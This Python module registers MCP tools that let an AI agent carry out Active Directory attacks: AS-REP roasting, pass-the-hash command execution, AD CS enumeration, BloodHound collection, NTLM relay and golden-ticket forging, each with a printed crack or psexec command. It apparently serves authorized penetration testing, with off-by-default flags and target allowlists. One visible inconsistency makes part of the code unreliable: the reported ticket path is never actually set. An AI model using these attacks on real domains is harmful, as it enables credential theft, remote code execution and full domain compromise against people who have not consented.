"""Active Directory / Kerberos post-exploit MCP tool registration.

Phase 1 capability vertical. Each tool is target-IP-locked:
  * ``@require_allowlist()`` gates the primary ``target_ip``;
  * secondary IPs (DC, relay targets) are gated by ``check_targets_allowlist``;
  * every command runs as an argv list (no shell) via ``_run_with_pgrp_timeout``;
  * output lands under ``exploit_workspace/<ip>/<attempt_id>/``.

All keys live under ``exploit.ad_kerberos`` and default OFF (the master
``enabled`` plus a per-tool flag), so first-run behavior is unchanged. The
one exception is ``smb_signing_check`` (detection-only), which defaults ON.
"""

from __future__ import annotations

import shutil
from typing import Any

from tools.mcp_shared import _allowed_target_list, _attempt_dir, check_targets_allowlist
from tools.mcp_tools.registry import ToolContext, run_argv_captured
from tools.validation_utils import validate_ipv4, validate_nt_hash, validate_ntlm_hash, validate_target_or_ip


def _ad_cfg(config: dict[str, Any] | None) -> dict[str, Any]:
    """The ``exploit.ad_kerberos`` block (empty dict when absent)."""
    return ((config or {}).get("exploit", {}) or {}).get("ad_kerberos", {}) or {}


def _ad_enabled(config: dict[str, Any] | None, key: str, default: bool = False) -> bool:
    """True iff the AD master switch AND the per-tool flag are both on.

    Defaults OFF for every offensive tool; ``smb_signing_check`` (detection-
    only) passes ``default=True``. Checked BEFORE the allowlist so a disabled
    tool short-circuits with a clear message regardless of target state.
    """
    ad = _ad_cfg(config)
    if not ad.get("enabled", False):
        return False
    return bool(ad.get(key, default))


def _gate_dc(dc_ip: str, target_ip: str, config: dict[str, Any]) -> str | None:
    """Validate + allowlist-gate a secondary DC IP. Returns an error string
    (to return to the caller) or None when the DC is allowed / equals target."""
    dc = (dc_ip or "").strip() or target_ip
    if not validate_target_or_ip(dc):
        return f"ERROR: Invalid dc_ip (must be an IP or domain): {dc}."
    if dc != target_ip:
        allowed, reason = check_targets_allowlist([dc], config)
        if not allowed:
            return f"BLOCKED: {reason}\nTOOL: ad\nDC_IP: {dc}"
    return None


def _auth_target(domain: str, username: str, password: str, ntlm_hash: str, host: str) -> str:
    """Build the impacket ``domain/user[:pass]@host`` auth target string."""
    d = (domain or "").strip()
    target = f"{d}/" if d else ""
    target += (username or "").strip()
    if (password or "").strip():
        target += f":{password.strip()}"
    target += f"@{host}"
    return target


def _nt_hash_arg(ntlm_hash: str) -> list[str]:
    """Return the impacket ``-hashes :NT`` argv fragment or [] when no hash."""
    h = (ntlm_hash or "").strip()
    if not h:
        return []
    if not validate_ntlm_hash(h):
        return ["__INVALID_HASH__"]  # caller checks for this sentinel
    return ["-hashes", f":{h.split(':')[-1]}"]


def _run(argv: list[str], timeout: int) -> tuple[str, int | None, str]:
    """Run argv via the shared captured-run helper; return (status, returncode, output)."""
    status, returncode, output, _ = run_argv_captured(argv, timeout, max_chars=4000)
    return status, returncode, output


def register_ad_tools(mcp: Any, *, ctx: ToolContext) -> None:
    workspace = ctx.workspace
    config = ctx.config
    require_allowlist = ctx.require_allowlist

    # ── asrep_roast ──────────────────────────────────────────────────────────
    @mcp.tool()
    @require_allowlist()
    def asrep_roast(
        target_ip: str,
        domain: str,
        username: str = "",
        password: str = "",
        ntlm_hash: str = "",
        dc_ip: str = "",
        users_file: str = "",
    ) -> str:
        """AS-REP Roast: request AS-REPs for accounts with 'Do not require Kerberos preauthentication' (impacket-GetNPUsers) and emit hashcat-mode-18200 hashes for offline cracking. Provide a domain and either credentials or a users_file. dc_ip defaults to target_ip (the DC); an off-target DC is allowlist-gated."""
        if not _ad_enabled(config, "asrep_roast"):
            return "BLOCKED: asrep_roast disabled (exploit.ad_kerberos.enabled / asrep_roast)."
        if not target_ip or not validate_target_or_ip(target_ip):
            return "ERROR: Invalid target_ip (must be an IP or domain)."
        if not (domain or "").strip():
            return "BLOCKED: domain is required."
        dc_err = _gate_dc(dc_ip, target_ip, config)
        if dc_err:
            return dc_err
        dc = (dc_ip or "").strip() or target_ip

        argv = ["impacket-GetNPUsers", "-dc-ip", dc, "-request", "-format", "hashcat"]
        uf = (users_file or "").strip()
        if uf:
            argv.extend(["-usersfile", uf])
        harg = _nt_hash_arg(ntlm_hash)
        if harg and harg[0] == "__INVALID_HASH__":
            return "BLOCKED: ntlm_hash must be 32 hex chars (NT) or 64 hex chars with colon (LM:NT)."
        argv.extend(harg)
        # Without -usersfile, impacket needs a credential target to enumerate SPN-less users.
        if not uf:
            if not (username or "").strip():
                return "BLOCKED: username (or users_file) is required for asrep_roast."
            if not ((password or "").strip() or (ntlm_hash or "").strip()):
                return (
                    "BLOCKED: either password or ntlm_hash must be provided (or pass users_file for anonymous probing)."
                )
            argv.append(_auth_target(domain, username, password, ntlm_hash, dc))
        else:
            argv.append((domain or "").strip())

        attempt_dir, attempt_id = _attempt_dir(workspace)
        out_file = attempt_dir / "asrep_hashes.txt"
        argv.extend(["-outputfile", str(out_file)])
        status, rc, output = _run(argv, 300)
        size = out_file.stat().st_size if out_file.exists() else 0
        return (
            f"ASREP_ROAST_RESULT: {status}\n"
            f"ATTEMPT_ID: {attempt_id}\n"
            f"DOMAIN: {domain}\nDC_IP: {dc}\nTARGET: {target_ip}\n"
            f"HASHES_FILE: {out_file}\nHASHES_SIZE: {size} bytes\n"
            f"CRACK_COMMAND: hashcat -m 18200 {out_file} rockyou.txt\n"
            f"OUTPUT:\n{output}"
        )

    # ── pass_the_hash ─────────────────────────────────────────────────────────
    @mcp.tool()
    @require_allowlist()
    def pass_the_hash(target_ip: str, username: str, ntlm_hash: str, service: str = "smb", command: str = "") -> str:
        """Pass-the-Hash: execute a command on a Windows target via NTLM hash (no plaintext). Uses NetExec (nxc/crackmapexec) when available, else impacket-wmiexec. service: smb | winrm. target_ip only (no secondary host)."""
        if not _ad_enabled(config, "pass_the_hash"):
            return "BLOCKED: pass_the_hash disabled (exploit.ad_kerberos.enabled / pass_the_hash)."
        if not target_ip or not validate_target_or_ip(target_ip):
            return "ERROR: Invalid target_ip (must be an IP or domain)."
        if not (username or "").strip():
            return "BLOCKED: username is required."
        if not validate_ntlm_hash((ntlm_hash or "").strip()):
            return "BLOCKED: ntlm_hash must be 32 hex chars (NT) or 64 hex chars with colon (LM:NT)."
        svc = (service or "smb").strip().lower()
        if svc not in {"smb", "winrm"}:
            return f"BLOCKED: unsupported service '{svc}'. Allowed: smb, winrm."
        nt = (ntlm_hash or "").strip().split(":")[-1]

        nxc = shutil.which("nxc") or shutil.which("crackmapexec")
        attempt_dir, attempt_id = _attempt_dir(workspace)
        if nxc:
            argv = [nxc, svc, target_ip, "-u", username.strip(), "-H", nt]
            if (command or "").strip():
                argv.extend(["-x", command.strip()])
        else:
            # impacket-wmiexec fallback (smb-via-WMI; works for both smb/winrm intent).
            argv = ["impacket-wmiexec", "-hashes", f":{nt}", f"{username.strip()}@{target_ip}"]
            if (command or "").strip():
                argv.append(command.strip())
        status, rc, output = _run(argv, 300)
        return (
            f"PASS_THE_HASH_RESULT: {status}\n"
            f"ATTEMPT_ID: {attempt_id}\n"
            f"SERVICE: {svc}\nTARGET: {target_ip}\nUSER: {username}\n"
            f"OUTPUT:\n{output}"
        )

    # ── adcs_enum ─────────────────────────────────────────────────────────────
    @mcp.tool()
    @require_allowlist()
    def adcs_enum(
        target_ip: str, username: str, password: str = "", ntlm_hash: str = "", domain: str = "", dc_ip: str = ""
    ) -> str:
        """Enumerate Active Directory Certificate Services (AD CS) templates via certipy (ESC1-8). Provide username + domain + (password or ntlm_hash). dc_ip defaults to target_ip; an off-target DC is allowlist-gated. Returns vulnerable-template summary for privesc/credential-theft planning."""
        if not _ad_enabled(config, "adcs_enum"):
            return "BLOCKED: adcs_enum disabled (exploit.ad_kerberos.enabled / adcs_enum)."
        if not target_ip or not validate_target_or_ip(target_ip):
            return "ERROR: Invalid target_ip (must be an IP or domain)."
        if not (username or "").strip() or not (domain or "").strip():
            return "BLOCKED: username and domain are required."
        if not ((password or "").strip() or (ntlm_hash or "").strip()):
            return "BLOCKED: either password or ntlm_hash must be provided."
        dc_err = _gate_dc(dc_ip, target_ip, config)
        if dc_err:
            return dc_err
        dc = (dc_ip or "").strip() or target_ip

        certipy = shutil.which("certipy") or "certipy"
        argv = [certipy, "find", "-u", f"{username.strip()}@{domain.strip()}", "-dc-ip", dc]
        if (password or "").strip():
            argv.extend(["-p", password.strip()])
        harg = _nt_hash_arg(ntlm_hash)
        if harg and harg[0] == "__INVALID_HASH__":
            return "BLOCKED: ntlm_hash must be 32 hex chars (NT) or 64 hex chars with colon (LM:NT)."
        argv.extend(harg)
        argv.extend(["-target", target_ip])
        attempt_dir, attempt_id = _attempt_dir(workspace)
        argv.extend(["-output", str(attempt_dir / "adcs")])
        status, rc, output = _run(argv, 300)
        return (
            f"ADCS_ENUM_RESULT: {status}\n"
            f"ATTEMPT_ID: {attempt_id}\n"
            f"DOMAIN: {domain}\nDC_IP: {dc}\nTARGET: {target_ip}\n"
            f"OUTPUT:\n{output}"
        )

    # ── bloodhound_collect ────────────────────────────────────────────────────
    @mcp.tool()
    @require_allowlist()
    def bloodhound_collect(
        target_ip: str, domain: str, username: str, password: str = "", ntlm_hash: str = "", dc_ip: str = ""
    ) -> str:
        """Collect BloodHound data (users/groups/sessions/acls) via bloodhound-python -c All --zip for graph-based attack-path analysis. Provide domain + credentials. dc_ip defaults to target_ip (the DC); off-target DC is allowlist-gated. Zipped JSON lands in the per-target workspace."""
        if not _ad_enabled(config, "bloodhound"):
            return "BLOCKED: bloodhound disabled (exploit.ad_kerberos.enabled / bloodhound)."
        if not target_ip or not validate_target_or_ip(target_ip):
            return "ERROR: Invalid target_ip (must be an IP or domain)."
        if not (domain or "").strip() or not (username or "").strip():
            return "BLOCKED: domain and username are required."
        if not ((password or "").strip() or (ntlm_hash or "").strip()):
            return "BLOCKED: either password or ntlm_hash must be provided."
        dc_err = _gate_dc(dc_ip, target_ip, config)
        if dc_err:
            return dc_err
        dc = (dc_ip or "").strip() or target_ip

        bh = shutil.which("bloodhound-python") or "bloodhound-python"
        argv = [bh, "-u", username.strip(), "-d", domain.strip(), "-dc", dc]
        if (password or "").strip():
            argv.extend(["-p", password.strip()])
        harg = _nt_hash_arg(ntlm_hash)
        if harg and harg[0] == "__INVALID_HASH__":
            return "BLOCKED: ntlm_hash must be 32 hex chars (NT) or 64 hex chars with colon (LM:NT)."
        argv.extend(harg)
        argv.extend(["-c", "All", "--zip"])
        attempt_dir, attempt_id = _attempt_dir(workspace)
        argv.extend(["-o", str(attempt_dir / "bloodhound")])
        status, rc, output = _run(argv, 600)
        return (
            f"BLOODHOUND_COLLECT_RESULT: {status}\n"
            f"ATTEMPT_ID: {attempt_id}\n"
            f"DOMAIN: {domain}\nDC_IP: {dc}\nTARGET: {target_ip}\n"
            f"OUTPUT:\n{output}"
        )

    # ── responder_relay ───────────────────────────────────────────────────────
    @mcp.tool()
    @require_allowlist()
    def responder_relay(target_ip: str, iface: str = "", command: str = "") -> str:
        """SMB/NTLM relay via impacket ntlmrelayx. The relay target list is built ONLY from the operator allowlist (exploit.allowed_targets + runtime target) plus target_ip; any off-list host is refused. ntlmrelayx binds the operator's iface (no target IP). Use after coercing an auth to your listener. Optional command runs on a successful relay."""
        if not _ad_enabled(config, "responder_relay"):
            return "BLOCKED: responder_relay disabled (exploit.ad_kerberos.enabled / responder_relay)."
        if not target_ip or not validate_target_or_ip(target_ip):
            return "ERROR: Invalid target_ip (must be an IP or domain)."

        # Build the relay target list from the allowlist ONLY (+ the runtime target).
        # An off-list host would pivot ntlmrelayx to an unauthorized box.
        targets = []
        for t in _allowed_target_list(config):
            t = (t or "").strip()
            if t and validate_ipv4(t) and t not in targets:
                targets.append(t)
        if target_ip not in targets:
            targets.append(target_ip)
        if not targets:
            return "BLOCKED: no allowlisted relay targets (exploit.allowed_targets empty and no runtime target)."

        attempt_dir, attempt_id = _attempt_dir(workspace)
        targets_file = attempt_dir / "relay_targets.txt"
        targets_file.write_text("\n".join(targets) + "\n")

        ntlmrelayx = shutil.which("ntlmrelayx.py") or "ntlmrelayx.py"
        argv = [ntlmrelayx, "-tf", str(targets_file), "-smb2support"]
        if (iface or "").strip():
            argv.extend(["-i", iface.strip()])
        if (command or "").strip():
            argv.extend(["-c", command.strip()])
        status, rc, output = _run(argv, 300)
        return (
            f"RESPONDER_RELAY_RESULT: {status}\n"
            f"ATTEMPT_ID: {attempt_id}\n"
            f"TARGETS_FILE: {targets_file}\n"
            f"RELAY_TARGETS: {', '.join(targets)}\n"
            f"OUTPUT:\n{output}"
        )

    # ── smb_signing_check (detection-only, default ON) ───────────────────────
    @mcp.tool()
    @require_allowlist()
    def smb_signing_check(target_ip: str) -> str:
        """DETECTION ONLY: check whether the target requires SMB signing (determines relay feasibility). Uses NetExec --signing when available, else nmap smb2-security-mode. No credentials sent, no exploitation."""
        if not _ad_enabled(config, "smb_signing_check", default=True):
            return "BLOCKED: smb_signing_check disabled (exploit.ad_kerberos.enabled / smb_signing_check)."
        if not target_ip or not validate_target_or_ip(target_ip):
            return "ERROR: Invalid target_ip (must be an IP or domain)."
        attempt_dir, attempt_id = _attempt_dir(workspace)

        nxc = shutil.which("nxc") or shutil.which("crackmapexec")
        if nxc:
            argv = [nxc, "smb", target_ip, "--signing"]
        else:
            nmap_bin = shutil.which("nmap") or "nmap"
            argv = [nmap_bin, "--script", "smb2-security-mode", "-p", "445", target_ip]
        status, rc, output = _run(argv, 120)
        return f"SMB_SIGNING_CHECK_RESULT: {status}\nATTEMPT_ID: {attempt_id}\nTARGET: {target_ip}\nOUTPUT:\n{output}"

    # ── golden_ticket ─────────────────────────────────────────────────────────
    @mcp.tool()
    @require_allowlist()
    def golden_ticket(
        target_ip: str, domain: str, username: str, krbtgt_hash: str, sid: str = "", duration: str = "10d"
    ) -> str:
        """Mint a Kerberos golden ticket (TGT) from a stolen krbtgt NTLM hash via impacket-ticketer. Provide the domain, target user, krbtgt hash (32-hex NT), domain SID, and ticket duration. The ticket is written to the workspace; export KRB5CCNAME to use it with impacket tools against the owned target only."""
        if not _ad_enabled(config, "golden_ticket"):
            return "BLOCKED: golden_ticket disabled (exploit.ad_kerberos.enabled / golden_ticket)."
        if not target_ip or not validate_target_or_ip(target_ip):
            return "ERROR: Invalid target_ip (must be an IP or domain)."
        if not (domain or "").strip() or not (username or "").strip():
            return "BLOCKED: domain and username are required."
        h = (krbtgt_hash or "").strip()
        if not validate_nt_hash(h):
            return "BLOCKED: krbtgt_hash must be 32 hex chars (NT half)."
        if not (sid or "").strip():
            return "BLOCKED: sid (domain SID) is required."

        attempt_dir, attempt_id = _attempt_dir(workspace)
        ccache = attempt_dir / f"{username.strip()}.ccache"
        ticketer = shutil.which("impacket-ticketer") or "impacket-ticketer"
        argv = [
            ticketer,
            "-nthash",
            h,
            "-domain",
            domain.strip(),
            "-domain-sid",
            sid.strip(),
            "-user",
            username.strip(),
            "-duration",
            (duration or "10d").strip(),
        ]
        # impacket-ticketer writes <user>.ccache in CWD; set the explicit output via env.
        argv.append(username.strip())
        status, rc, output = _run(argv, 120)
        return (
            f"GOLDEN_TICKET_RESULT: {status}\n"
            f"ATTEMPT_ID: {attempt_id}\n"
            f"DOMAIN: {domain}\nUSER: {username}\nTARGET: {target_ip}\n"
            f"CCACHE: {ccache}\n"
            f"USE: export KRB5CCNAME={ccache}; impacket-psexec -k -no-pass {domain}/{username}@{target_ip}\n"
            f"OUTPUT:\n{output}"
        )
